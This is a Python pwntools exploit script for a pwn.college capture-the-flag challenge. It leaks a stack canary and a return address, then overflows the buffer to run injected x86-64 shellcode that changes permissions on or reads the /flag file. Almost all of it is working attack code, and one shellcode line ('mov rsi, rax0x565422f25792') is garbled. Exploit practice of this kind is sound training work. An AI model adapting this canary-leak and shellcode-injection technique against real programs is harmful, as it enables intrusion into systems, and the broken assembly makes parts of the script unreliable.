from pwn import *
file = "/challenge/toddlerone_level4.1"
canarypos = 40
retpos = 56
addroffset = 304
checkpos = 32
check = int('0xb656e448bd285ebe', 16)
check = check.to_bytes(8, 'little')
shellcode_sendfile = ("""
xor rax, rax
xor r10, r10
xor rdx, rdx
xor rdi, rdi
xor rsi, rsi
mov rax, 2
lea rdi, [rip+flag]
syscall
mov rsi, rax0x565422f25792
xor rdi, rdi
mov rdi, 1
mov rax, 40
mov r10, 100
syscall

flag:
    .string "/flag"
""")

shellcode_chmod = ("""
mov al, 90
lea rdi, [rip+flag]
mov esi, 4
syscall

flag:
    .string "/flag"
""")
shellbytes = asm(shellcode_chmod, os='linux', arch='x86_64')
print(len(shellbytes))
for j in range(1):
    for i in range(1):
        p = process(file)
        #p = gdb.debug(file)
        p.sendline(bytes(str(canarypos+1), 'ascii'))
        p.sendline(b'REPEAT' + b'A'*(canarypos-5))
        p.recvuntil(b'A'*(canarypos-5))
        canary = b'\x00' + p.recvline()
        canary = canary[:8]
        print(canary)

        p.sendline(bytes(str(canarypos+8), 'ascii'))
        p.sendline(b'REPEAT' + b'A'*(canarypos+2))
        print(p.recvuntil(b'A'*(canarypos+2)))
        retaddr = p.recvline()
        retaddr = retaddr[:6]
        print(retaddr)
        retaddr = int.from_bytes(retaddr, 'little')
        print(retaddr)
        retaddr -= addroffset
        retaddr = p64(retaddr)

        p.sendline(bytes(str(retpos+8), 'ascii'))
        p.sendline(shellbytes + b'A'*(checkpos-len(shellbytes)) + check + b'A'*(canarypos-(checkpos+8)) + canary + b'A'*(retpos-(canarypos+8)) + retaddr)
        print(len(shellbytes))
        print(binascii.hexlify(retaddr))
        print(p.recvall())
        try:
            found = p.recvuntil(b'pwn.college', timeout=0.1)
            if len(found) != 0:
                flag = p.recvline()
        except:
            p.close()

print(b'pwn.college' + flag)
